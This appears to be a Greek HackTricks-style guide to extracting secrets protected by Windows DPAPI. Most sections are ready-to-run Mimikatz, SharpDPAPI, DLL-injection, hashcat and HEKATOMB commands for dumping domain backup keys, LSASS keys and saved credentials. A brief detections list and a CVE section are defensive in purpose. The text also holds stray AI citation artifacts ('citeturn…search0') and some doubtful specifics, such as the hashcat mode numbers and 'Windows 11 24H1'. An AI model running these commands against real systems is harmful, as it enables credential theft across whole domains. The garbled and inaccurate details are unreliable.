# DPAPI - Εξαγωγή Κωδικών

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Η API Προστασίας Δεδομένων (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για την **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, εκμεταλλευόμενη είτε μυστικά χρήστη είτε συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση του συστήματος, τα μυστικά αυθεντικοποίησης του τομέα του συστήματος, αποφεύγοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης οι ίδιοι.

Ο πιο κοινός τρόπος χρήσης του DPAPI είναι μέσω των **`CryptProtectData` και `CryptUnprotectData`** συναρτήσεων, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια με τη συνεδρία της διαδικασίας που είναι αυτή τη στιγμή συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή το σύστημα που τα κρυπτογράφησε.

Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μια **παράμετρο `entropy`** η οποία θα χρησιμοποιηθεί κατά την κρυπτογράφηση και την αποκρυπτογράφηση, επομένως, για να αποκρυπτογραφήσετε κάτι που έχει κρυπτογραφηθεί χρησιμοποιώντας αυτή την παράμετρο, πρέπει να παρέχετε την ίδια τιμή εντροπίας που χρησιμοποιήθηκε κατά την κρυπτογράφηση.

### Δημιουργία κλειδιών χρηστών

Το DPAPI δημιουργεί ένα μοναδικό κλειδί (που ονομάζεται **`pre-key`**) για κάθε χρήστη με βάση τα διαπιστευτήριά τους. Αυτό το κλειδί προέρχεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο του χρήστη αλλά καταλήγει να είναι SHA1. Για παράδειγμα, για χρήστες τομέα, **εξαρτάται από το HTLM hash του χρήστη**.

Αυτό είναι ιδιαίτερα ενδιαφέρον γιατί αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού πρόσβασης του χρήστη, μπορεί να:

- **Αποκρυπτογραφήσει οποιαδήποτε δεδομένα έχουν κρυπτογραφηθεί χρησιμοποιώντας DPAPI** με το κλειδί αυτού του χρήστη χωρίς να χρειάζεται να επικοινωνήσει με καμία API
- Προσπαθήσει να **σπάσει τον κωδικό πρόσβασης** εκτός σύνδεσης προσπαθώντας να δημιουργήσει το έγκυρο κλειδί DPAPI

Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη χρησιμοποιώντας DPAPI, δημιουργείται ένα νέο **master key**. Αυτό το master key είναι το οποίο χρησιμοποιείται πραγματικά για την κρυπτογράφηση των δεδομένων. Κάθε master key συνοδεύεται από ένα **GUID** (Παγκόσμια Μοναδική Ταυτότητα) που το αναγνωρίζει.

Τα master keys αποθηκεύονται στον **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** φάκελο, όπου `{SID}` είναι ο Αναγνωριστής Ασφαλείας αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο με το **`pre-key`** του χρήστη και επίσης με ένα **κλειδί εφεδρείας τομέα** για ανάκτηση (έτσι το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο 2 φορές με 2 διαφορετικούς κωδικούς).

Σημειώστε ότι το **κλειδί τομέα που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους ελεγκτές τομέα και δεν αλλάζει ποτέ**, επομένως αν ένας επιτιθέμενος έχει πρόσβαση στον ελεγκτή τομέα, μπορεί να ανακτήσει το κλειδί εφεδρείας τομέα και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στον τομέα.

Τα κρυπτογραφημένα blobs περιέχουν το **GUID του master key** που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων μέσα στις κεφαλίδες του.

> [!TIP]
> Τα κρυπτογραφημένα blobs του DPAPI ξεκινούν με **`01 00 00 00`**

Βρείτε τα master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Αυτό είναι πώς θα φαίνονται μια σειρά από Master Keys ενός χρήστη:

![](<../../images/image (1121).png>)

### Δημιουργία κλειδιών Μηχανής/Συστήματος

Αυτό είναι το κλειδί που χρησιμοποιείται για να κρυπτογραφήσει δεδομένα η μηχανή. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, το οποίο είναι ένα ειδικό κλειδί που μπορεί να προσπελαστεί μόνο από τον χρήστη SYSTEM. Αυτό το κλειδί χρησιμοποιείται για να κρυπτογραφήσει δεδομένα που πρέπει να είναι προσβάσιμα από το ίδιο το σύστημα, όπως διαπιστευτήρια επιπέδου μηχανής ή μυστικά σε επίπεδο συστήματος.

Σημειώστε ότι αυτά τα κλειδιά **δεν έχουν αντίγραφο ασφαλείας τομέα** οπότε είναι προσβάσιμα μόνο τοπικά:

- **Mimikatz** μπορεί να έχει πρόσβαση σε αυτό εκτελώντας dump LSA secrets με την εντολή: `mimikatz lsadump::secrets`
- Το μυστικό αποθηκεύεται μέσα στη μητρώο, οπότε ένας διαχειριστής θα μπορούσε να **τροποποιήσει τα δικαιώματα DACL για να έχει πρόσβαση σε αυτό**. Η διαδρομή μητρώου είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Προστατευμένα Δεδομένα από DPAPI

Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι:

- Διαπιστευτήρια Windows
- Κωδικοί πρόσβασης και δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- Κωδικοί πρόσβασης για λογαριασμούς ηλεκτρονικού ταχυδρομείου και εσωτερικούς λογαριασμούς FTP για εφαρμογές όπως το Outlook και το Windows Mail
- Κωδικοί πρόσβασης για κοινόχρηστα φακέλους, πόρους, ασύρματα δίκτυα και Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- Κωδικοί πρόσβασης για απομακρυσμένες συνδέσεις επιφάνειας εργασίας, .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και αυθεντικοποίησης
- Κωδικοί πρόσβασης δικτύου που διαχειρίζεται ο Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν CryptProtectData, όπως το Skype, το MSN messenger και άλλα
- Κρυπτογραφημένα blobs μέσα στο μητρώο
- ...

Τα προστατευμένα δεδομένα του συστήματος περιλαμβάνουν:
- Κωδικοί πρόσβασης Wifi
- Κωδικοί πρόσβασης προγραμματισμένων εργασιών
- ...

### Επιλογές εξαγωγής Master key

- Εάν ο χρήστης έχει δικαιώματα διαχειριστή τομέα, μπορεί να έχει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα master keys χρηστών στον τομέα:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με δικαιώματα τοπικού διαχειριστή, είναι δυνατόν να **προσεγγίσετε τη μνήμη LSASS** για να εξάγετε τα κύρια κλειδιά DPAPI όλων των συνδεδεμένων χρηστών και το κλειδί SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Αν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να έχει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα κλειδιά του μηχανήματος:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Αν είναι γνωστός ο κωδικός πρόσβασης ή το hash NTLM του χρήστη, μπορείτε **να αποκρυπτογραφήσετε τα κύρια κλειδιά του χρήστη απευθείας**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Αν βρίσκεστε μέσα σε μια συνεδρία ως χρήστης, είναι δυνατόν να ζητήσετε από τον DC το **backup key για να αποκρυπτογραφήσετε τα master keys χρησιμοποιώντας RPC**. Αν είστε τοπικός διαχειριστής και ο χρήστης είναι συνδεδεμένος, θα μπορούσατε να **κλέψετε το session token του** για αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Θησαυρού
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε Δεδομένα Κρυπτογραφημένα με DPAPI

### Βρείτε Δεδομένα Κρυπτογραφημένα με DPAPI

Κοινά αρχεία **που προστατεύονται** είναι σε:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης αλλάζοντας το `\Roaming\` σε `\Local\` στα παραπάνω μονοπάτια.

Παραδείγματα αρίθμησης:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να βρει κρυπτογραφημένα blobs DPAPI στο σύστημα αρχείων, μητρώο και B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο αποθετήριο) μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση ευαίσθητων δεδομένων όπως τα cookies χρησιμοποιώντας DPAPI.

### Κλειδιά πρόσβασης και δεδομένα

- **Χρησιμοποιήστε το SharpDPAPI** για να αποκτήσετε διαπιστευτήρια από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Λάβετε πληροφορίες διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Πρόσβαση σε masterkeys**:

Αποκρυπτογραφήστε ένα masterkey ενός χρήστη ζητώντας το **domain backup key** χρησιμοποιώντας RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για την αποκρυπτογράφηση του masterkey (σημειώστε πώς είναι δυνατόν να χρησιμοποιήσετε το `/rpc` για να αποκτήσετε το κλειδί αντιγράφου ασφαλείας τομέα, το `/password` για να χρησιμοποιήσετε έναν απλό κωδικό πρόσβασης ή το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού τομέα DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Αποκρυπτογράφηση δεδομένων χρησιμοποιώντας ένα masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για την αποκρυπτογράφηση `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε πώς είναι δυνατό να χρησιμοποιήσετε το `/rpc` για να αποκτήσετε το κλειδί αντιγράφου ασφαλείας τομέα, το `/password` για να χρησιμοποιήσετε έναν απλό κωδικό πρόσβασης, το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού τομέα DPAPI, το `/unprotect` για να χρησιμοποιήσετε την τρέχουσα συνεδρία χρηστών...).
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Αποκρυπτογραφήστε κάποια δεδομένα χρησιμοποιώντας **την τρέχουσα συνεδρία χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Διαχείριση Προαιρετικής Εντροπίας ("Εντροπία τρίτων")

Ορισμένες εφαρμογές περνούν μια επιπλέον **εντροπία** στην `CryptProtectData`. Χωρίς αυτή την τιμή, το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμη και αν είναι γνωστό το σωστό masterkey. Η απόκτηση της εντροπίας είναι επομένως απαραίτητη όταν στοχεύουμε σε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, ορισμένοι πελάτες VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι μια DLL σε λειτουργία χρήστη που συνδέει τις λειτουργίες DPAPI μέσα στη στοχοθετημένη διαδικασία και καταγράφει διαφανώς οποιαδήποτε προαιρετική εντροπία παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** mode κατά διαδικασιών όπως το `outlook.exe` ή το `vpnclient.exe` θα εξάγει ένα αρχείο που αντιστοιχεί κάθε buffer εντροπίας στη διαδικασία κλήσης και στο blob. Η καταγεγραμμένη εντροπία μπορεί αργότερα να παρασχεθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) προκειμένου να αποκρυπτογραφηθεί τα δεδομένα. citeturn5search0
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε μια μορφή masterkey **context 3** ξεκινώντας με τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) και **22102** (context 3) επιτρέποντας την επιτάχυνση cracking των κωδικών πρόσβασης χρηστών απευθείας από το αρχείο masterkey. Οι επιτιθέμενοι μπορούν επομένως να εκτελούν επιθέσεις με λίστες λέξεων ή brute-force χωρίς να αλληλεπιδρούν με το σύστημα-στόχο. citeturn8search1

`DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει τα Credential και Vault blobs, να τα αποκρυπτογραφήσει με σπασμένα κλειδιά και να εξάγει καθαρό κείμενο κωδικούς πρόσβασης.

### Πρόσβαση σε δεδομένα άλλης μηχανής

Στο **SharpDPAPI και SharpChrome** μπορείτε να υποδείξετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα μιας απομακρυσμένης μηχανής. Φυσικά, πρέπει να μπορείτε να έχετε πρόσβαση σε αυτή τη μηχανή και στο παρακάτω παράδειγμα υποτίθεται ότι **το κλειδί κρυπτογράφησης αντιγράφου ασφαλείας του τομέα είναι γνωστό**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του κλειδιού αντιγράφου ασφαλείας του ελεγκτή τομέα μέσω RPC. Το σενάριο θα επιλύσει στη συνέχεια τη διεύθυνση IP όλων των υπολογιστών και θα εκτελέσει ένα smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το κλειδί αντιγράφου ασφαλείας του τομέα.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών που εξήχθη από το LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμα και αν δεν τα γνωρίζατε!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να εξάγει μυστικά που προστατεύονται από DPAPI αυτόματα. Η έκδοση 2.x εισήγαγε:

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Ανάλυση των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με Hashcat
* Υποστήριξη για κρυπτογραφημένα cookies "App-Bound" του Chrome (βλ. επόμενη ενότητα)
* Ένα νέο **`--snapshot`** mode για επαναλαμβανόμενη παρακολούθηση των endpoints και διαφορές στα νεοδημιουργημένα blobs citeturn1search2

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας αναλυτής C# για αρχεία masterkey/credential/vault που μπορεί να εξάγει μορφές Hashcat/JtR και προαιρετικά να εκκινήσει αυτόματα το cracking. Υποστηρίζει πλήρως τις μορφές masterkey μηχανής και χρήστη μέχρι τα Windows 11 24H1. citeturn2search0


## Κοινές ανιχνεύσεις

- Πρόσβαση σε αρχεία στο `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και άλλους σχετικούς με DPAPI καταλόγους.
- Ιδιαίτερα από ένα κοινόχρηστο δίκτυο όπως **C$** ή **ADMIN$**.
- Χρήση του **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη LSASS ή εξαγωγή masterkeys.
- Συμβάν **4662**: *Μια ενέργεια πραγματοποιήθηκε σε ένα αντικείμενο* – μπορεί να συσχετιστεί με την πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
- Συμβάν **4673/4674** όταν μια διαδικασία ζητά *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ευπάθειες 2023-2025 & αλλαγές οικοσυστήματος

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας επιτιθέμενος με πρόσβαση στο δίκτυο θα μπορούσε να εξαπατήσει ένα μέλος τομέα να ανακτήσει ένα κακόβουλο κλειδί αντιγράφου ασφαλείας DPAPI, επιτρέποντας την αποκρυπτογράφηση των masterkeys χρηστών. Διορθώθηκε στην σωρευτική ενημέρωση του Νοεμβρίου 2023 – οι διαχειριστές θα πρέπει να διασφαλίσουν ότι οι DCs και οι σταθμοί εργασίας είναι πλήρως ενημερωμένοι. citeturn4search0
* **Κρυπτογράφηση cookie "App-Bound" του Chrome 127** (Ιούλιος 2024) αντικατέστησε την κληρονομική προστασία μόνο DPAPI με ένα επιπλέον κλειδί που αποθηκεύεται κάτω από τον **Credential Manager** του χρήστη. Η εκτός σύνδεσης αποκρυπτογράφηση των cookies απαιτεί τώρα τόσο το masterkey DPAPI όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x είναι ικανά να ανακτήσουν το επιπλέον κλειδί όταν εκτελούνται με το πλαίσιο χρήστη. citeturn0search0


## Αναφορές

- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004
- https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
- https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/
- https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6
- https://github.com/Leftp/DPAPISnoop
- https://pypi.org/project/donpapi/2.0.0/

{{#include ../../banners/hacktricks-training.md}}
